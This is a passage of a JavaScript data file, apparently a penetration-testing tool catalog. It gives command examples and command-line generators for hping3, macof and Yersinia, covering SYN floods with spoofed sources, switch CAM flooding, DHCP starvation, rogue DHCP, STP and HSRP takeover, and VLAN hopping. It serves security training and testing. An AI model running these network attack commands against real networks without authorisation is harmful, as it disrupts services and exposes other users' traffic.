          if (inputs.autoToggle === 'true' && !inputs.mode.includes('-s')) {
             return `ifconfig ${inputs.interface} down && macchanger ${flag}${bia} ${inputs.interface} && ifconfig ${inputs.interface} up`;
          } else {
             return `macchanger ${flag}${bia} ${inputs.interface}`;
          }
        }
      }
    ]
  },
  {
    id: 'hping3',
    name: 'hping3',
    description: 'A network tool able to send highly customized ICMP/UDP/TCP packets and display target replies like ping does. Often used by hackers to perform advanced port scanning, OS fingerprinting, firewall testing, and massive TCP SYN flood Denial of Service attacks.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['packet', 'crafting', 'firewall-testing', 'tcp', 'dos'],
    commands: [
      { command: 'hping3 -S -p 80 192.168.1.100', description: 'Execute a fast TCP SYN scan natively against port 80' },
      { command: 'hping3 --flood -S -p 80 192.168.1.100', description: 'Launch a highly aggressive SYN flood DoS continuously (sends packets as fast as possible)' },
      { command: 'hping3 --rand-source -S -p 80 192.168.1.100', description: 'Launch a SYN scan/flood using randomized spoofed source IPs' },
      { command: 'hping3 -F -P -U -p 80 192.168.1.100', description: 'Send FIN, PUSH, and URG flags simultaneously (Xmas scan)' },
      { command: 'hping3 -c 1 -V -p 80 -s 5050 -k 192.168.1.100', description: 'Send a single custom packet to strictly verify firewall evasion rules' },
    ],
    whenToUse: [
      'To bypass stateful packet inspection natively testing raw firewall logic and ACLs',
      'To generate massive TCP traffic reliably evaluating internal DoS capabilities and network bandwidth limits',
      'For advanced stealth OS fingerprinting absolutely bypassing strict Intrusion Detection Systems',
    ],
    commonFlags: [
      { flag: '-S', description: 'Set TCP SYN flag' },
      { flag: '-p', description: 'Target destination port' },
      { flag: '--flood', description: 'Send packets as fast as possible, do not show replies' },
      { flag: '--rand-source', description: 'Spoof the source IP with random addresses' },
      { flag: '-c', description: 'Stop after sending a specific count of packets' },
      { flag: '-d', description: 'Data size (append arbitrary bytes to the packet body)' },
    ],
    relatedTools: ['scapy', 'nmap', 'nping'],
    installation: 'sudo apt install hping3 -y',
    website: 'https://github.com/antirez/hping',
    interactiveCommands: [
      {
        name: 'hping3 Packet Cannon',
        description: 'Craft and fire custom TCP/UDP/ICMP packets for port scanning, firewall testing, and DoS stress testing.',
        inputs: [
          { id: 'target', label: 'Target IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP address' },
          { id: 'scanMode', label: 'Packet Mode', type: 'select', options: ['TCP SYN (-S)', 'TCP ACK (-A)', 'TCP FIN (-F)', 'Xmas Scan (-F -P -U)', 'UDP Mode (--udp)', 'ICMP Ping (-1)'], defaultValue: 'TCP SYN (-S)' },
          { id: 'port', label: 'Target Port (-p)', type: 'text', defaultValue: '80', placeholder: 'e.g., 80, 443, 22' },
          { id: 'count', label: 'Packet Count (-c)', type: 'text', defaultValue: '4', placeholder: 'Number of packets (empty=infinite)' },
          { id: 'flood', label: 'Flood Mode (--flood)', type: 'checkbox', defaultValue: 'false', placeholder: 'Send as fast as possible' },
          { id: 'randSource', label: 'Random Source IP (--rand-source)', type: 'checkbox', defaultValue: 'false', placeholder: 'Spoof source addresses' },
          { id: 'dataSize', label: 'Data Size (-d)', type: 'text', defaultValue: '', placeholder: 'e.g., 120 (bytes of payload)' }
        ],
        generator: (inputs) => {
          let flags = '-S';
          if (inputs.scanMode.includes('-A')) flags = '-A';
          else if (inputs.scanMode.includes('Xmas')) flags = '-F -P -U';
          else if (inputs.scanMode.includes('-F') && !inputs.scanMode.includes('Xmas')) flags = '-F';
          else if (inputs.scanMode.includes('--udp')) flags = '--udp';
          else if (inputs.scanMode.includes('-1')) flags = '-1';
          const port = !inputs.scanMode.includes('-1') ? ` -p ${inputs.port}` : '';
          const count = inputs.count && inputs.flood !== 'true' ? ` -c ${inputs.count}` : '';
          const flood = inputs.flood === 'true' ? ' --flood' : '';
          const rand = inputs.randSource === 'true' ? ' --rand-source' : '';
          const data = inputs.dataSize ? ` -d ${inputs.dataSize}` : '';
          return `hping3 ${flags}${port}${count}${flood}${rand}${data} ${inputs.target}`;
        }
      }
    ]
  },
  {
    id: 'macof',
    name: 'macof',
    description: 'A utility from the dsniff suite that floods the local network with random MAC addresses. This causes the network switch\'s CAM table to overflow, forcing the switch to fail open and act as a hub. Once it acts as a hub, it broadcasts all traffic to all ports, allowing an attacker to sniff the entire network.',
    category: 'sniffing-spoofing',
    difficulty: 'beginner',
    tags: ['mac-flooding', 'cam-overflow', 'dsniff', 'layer2', 'dos'],
    commands: [
      { command: 'macof -i eth0', description: 'Instantly flood the local network on eth0 with thousands of random MAC addresses' },
      { command: 'macof -i eth0 -n 1000', description: 'Send exactly 1000 random MAC packets and then stop' },
      { command: 'macof -i eth0 -d 192.168.1.1', description: 'Flood traffic directed specifically at the gateway router IP' },
      { command: 'macof -i eth0 -s 10.0.0.5', description: 'Set a specific source IP for the flooded packets (spoofing the origin)' },
      { command: 'macof -i eth0 -e 00:11:22:33:44:55', description: 'Set a specific source MAC address (instead of random)' },
      { command: 'macof -i eth0 & tcpdump -i eth0 -w full_capture.pcap', description: 'Flood the CAM table WHILE capturing all traffic that spills out (combo attack)' },
    ],
    whenToUse: [
      'To force a network switch into "hub mode" (fail-open) so you can sniff traffic meant for other machines',
      'During physical red team engagements on poorly configured internal networks lacking port security',
      'As a Layer 2 Denial of Service attack against internal switching infrastructure',
      'Combined with Wireshark/tcpdump to passively capture traffic after the switch fails open',
    ],
    commonFlags: [
      { flag: '-i', description: 'Interface to use' },
      { flag: '-s', description: 'Specify a source IP address (instead of random)' },
      { flag: '-d', description: 'Specify a destination IP address (instead of random)' },
      { flag: '-e', description: 'Specify a source MAC address (instead of random)' },
      { flag: '-n', description: 'Number of packets to send (default is infinite)' },
    ],
    outputExample: [
      '68:1c:a2:b1:cf:d5 31:4b:e1:c3:9f:12 0.0.0.0.28080 > 0.0.0.0.20384: S 1234567890:1234567890(0) win 512',
      '5b:2d:c3:e4:f5:16 2a:1b:3c:4d:5e:6f 0.0.0.0.48123 > 0.0.0.0.18342: S 9876543210:9876543210(0) win 512',
      '(... thousands of lines per second ...)'
    ],
    relatedTools: ['yersinia', 'arpspoof', 'dsniff'],
    installation: 'sudo apt install dsniff -y',
    website: 'https://github.com/ggreer/dsniff',
    interactiveCommands: [
      {
        name: 'macof CAM Flooder',
        description: 'Generate massive Layer 2 MAC flooding attacks to overwhelm network switch CAM tables.',
        inputs: [
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0' },
          { id: 'count', label: 'Packet Count (-n)', type: 'text', defaultValue: '', placeholder: 'Leave blank for infinite' },
          { id: 'dstIp', label: 'Destination IP (-d)', type: 'text', defaultValue: '', placeholder: 'Target specific IP' },
          { id: 'srcIp', label: 'Source IP (-s)', type: 'text', defaultValue: '', placeholder: 'Spoof specific Source IP' },
          { id: 'srcMac', label: 'Source MAC (-e)', type: 'text', defaultValue: '', placeholder: 'Spoof specific Source MAC' },
          { id: 'dstMac', label: 'Destination MAC (-x)', type: 'text', defaultValue: '', placeholder: 'Target specific Dest MAC' },
          { id: 'tcpdump', label: 'Run with tcpdump', type: 'checkbox', defaultValue: 'false', placeholder: 'Capture spillage simultaneously' }
        ],
        generator: (inputs) => {
          let cmd = `macof -i ${inputs.interface}`;
          
          if (inputs.count) cmd += ` -n ${inputs.count}`;
          if (inputs.dstIp) cmd += ` -d ${inputs.dstIp}`;
          if (inputs.srcIp) cmd += ` -s ${inputs.srcIp}`;
          if (inputs.srcMac) cmd += ` -e ${inputs.srcMac}`;
          if (inputs.dstMac) cmd += ` -x ${inputs.dstMac}`;
          
          if (inputs.tcpdump === 'true') {
             return `${cmd} & tcpdump -i ${inputs.interface} -w macof_capture.pcap`;
          }
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'yersinia',
    name: 'Yersinia',
    description: 'A powerful network framework designed to exploit weaknesses in various Layer 2 protocols (STP, CDP, DTP, DHCP, HSRP, VTP). Often used for advanced network infrastructure attacks, taking over the root bridge in spanning-tree or creating rogue VLAN trunks.',
    category: 'sniffing-spoofing',
    difficulty: 'advanced',
    tags: ['layer2', 'stp', 'cdp', 'dhcp', 'infrastructure'],
    commands: [
      { command: 'yersinia -G', description: 'Launch the GTK Graphical User Interface for visual point-and-click attacks' },
      { command: 'yersinia -I', description: 'Launch the ncurses-based interactive terminal interface' },
      { command: 'yersinia dhcp -attack 1 -interface eth0', description: 'Execute a DHCP starvation attack from the command line (exhausts all IPs in the scope)' },
      { command: 'yersinia dhcp -attack 2 -interface eth0', description: 'Launch a rogue DHCP server that hands out your IP as the default gateway (MITM)' },
      { command: 'yersinia stp -attack 1 -interface eth0', description: 'Execute a Spanning Tree Protocol (STP) Claim Root Role attack (become the root bridge)' },
      { command: 'yersinia stp -attack 2 -interface eth0', description: 'STP TCN attack: force topology change notifications causing network instability' },
      { command: 'yersinia dtp -attack 1 -interface eth0', description: 'DTP: negotiate a trunk link with the switch to access all VLANs (VLAN hopping)' },
      { command: 'yersinia cdp -attack 1 -interface eth0', description: 'CDP flood: send fake Cisco Discovery Protocol frames to overwhelm the switch' },
      { command: 'yersinia hsrp -attack 1 -interface eth0', description: 'HSRP: claim the active router role to become the default gateway for all traffic' },
    ],
    whenToUse: [
      'When you need to attack the core network infrastructure (switches/routers) rather than endpoints',
      'To establish a rogue VLAN trunk to hop across segmented networks natively (DTP attack)',
      'To exhaust DHCP pools so you can stand up your own rogue DHCP server (like Responder)',
      'To take over the root bridge in STP and become the network\'s forwarding decision point',
      'To claim the active HSRP router role and intercept all gateway-bound traffic',
    ],
    commonFlags: [
      { flag: '-G', description: 'Start GUI mode' },
      { flag: '-I', description: 'Start interactive terminal mode' },
      { flag: '-attack', description: 'Specify the attack number for the chosen protocol module' },
      { flag: '-interface', description: 'Network interface to use' },
      { flag: 'dhcp', description: 'DHCP protocol attacks module' },
      { flag: 'stp', description: 'Spanning Tree Protocol attacks module' },
      { flag: 'dtp', description: 'DTP (Dynamic Trunking Protocol) VLAN hopping module' },
      { flag: 'cdp', description: 'Cisco Discovery Protocol flooding module' },
      { flag: 'hsrp', description: 'Hot Standby Router Protocol takeover module' },
    ],
    outputExample: [
      '[Interactive Mode Display]',
      'Yersinia 0.8.2 - Protocol weaknesses exploitation',
      'Current Protocol: DHCP',
      'Attacks:',
      '  0: sending RAW packet',
      '  1: sending DISCOVER packet',
      '  2: sending creating DHCP rogue server'
    ],
    relatedTools: ['scapy', 'ettercap', 'macof'],
    installation: 'sudo apt install yersinia -y',
    website: 'https://github.com/tomac/yersinia',
    interactiveCommands: [
      {
        name: 'Yersinia Infrastructure Exploiter',
        description: 'Configure and launch complex Layer 2 infrastructure attacks (STP, CDP, DTP, DHCP, HSRP).',
        inputs: [
          { id: 'interface', label: 'Interface (-interface)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0' },
          { id: 'mode', label: 'Interface Mode', type: 'select', options: ['Headless (CLI Attack)', 'GTK GUI (-G)', 'Interactive Shell (-I)'], defaultValue: 'Headless (CLI Attack)' },
          { id: 'protocol', label: 'Protocol Module', type: 'select', options: ['dhcp', 'stp', 'cdp', 'dtp', 'hsrp', 'vtp'], defaultValue: 'dhcp' },
          { id: 'attack', label: 'Attack Type (-attack)', type: 'select', options: ['0 (Raw Packet)', '1 (Standard Attack)', '2 (Advanced Attack)', '3', '4'], defaultValue: '1 (Standard Attack)' },
          { id: 'daemon', label: 'Run as Daemon (-D)', type: 'checkbox', defaultValue: 'false', placeholder: 'Run in background' },
          { id: 'macSpoof', label: 'Spoof MAC (-M)', type: 'checkbox', defaultValue: 'true', placeholder: 'Use a random source MAC' }
        ],
        generator: (inputs) => {
          let cmd = 'yersinia';
          
          if (inputs.mode === 'GTK GUI (-G)') return `${cmd} -G`;
          if (inputs.mode === 'Interactive Shell (-I)') return `${cmd} -I`;
          
          cmd += ` ${inputs.protocol}`;
          
          if (inputs.attack !== '0 (Raw Packet)') {
             cmd += ` -attack ${inputs.attack.split(' ')[0]}`;
          } else {
             cmd += ' -attack 0';
          }
          
          if (inputs.interface) cmd += ` -interface ${inputs.interface}`;
          if (inputs.daemon === 'true') cmd += ' -D';
          if (inputs.macSpoof === 'true') cmd += ' -M';
          
          return cmd;
        }
      }
    ]
  }
];
